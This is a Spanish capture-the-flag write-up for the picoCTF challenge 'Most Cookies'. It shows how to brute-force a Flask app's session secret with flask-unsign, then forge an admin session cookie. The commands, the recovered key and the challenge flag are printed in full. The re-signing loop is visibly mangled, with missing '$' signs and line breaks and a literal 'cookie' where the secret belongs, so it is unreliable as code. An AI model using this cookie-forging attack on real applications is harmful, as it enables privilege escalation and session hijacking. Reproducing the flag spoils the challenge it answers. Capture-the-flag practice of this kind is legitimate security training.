# Most Cookies

# Descripción del reto:

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [http://wily-courier.picoctf.net:58554/](http://wily-courier.picoctf.net:58554/)

# Solución:

 curl -i [http://wily-courier.picoctf.net:58554/](http://wily-courier.picoctf.net:58554/) Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9...

~/.local/bin/flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aaeMyg.0MWClszdECQaRHm5uFEy89YDPV8" --wordlist cookies.txt [*] Session decodes to: {'very_auth': 'blank'} [+] Found secret key after 28 attempts: 'snickerdoodle'

for cookie in (catcookies.txt);doC=(~/.local/bin/flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret "cookie")RES=(curl -s -L -b "session=$C" [http://wily-courier.picoctf.net:58554/display](http://wily-courier.picoctf.net:58554/display)) if echo "$RES" | grep -q "picoCTF"; then echo "$RES" | grep "picoCTF" break fi done picoCTF{cO0ki3s_yum_e45c084f}

'picoCTF{cO0ki3s_yum_e45c084f}'

# Notas adicionales:

Ataque de Session Hijacking. Las cookies de Flask están firmadas; al obtener la Secret Key mediante fuerza bruta, es posible refirmar cookies para ganar privilegios de administrador.

# Referencias: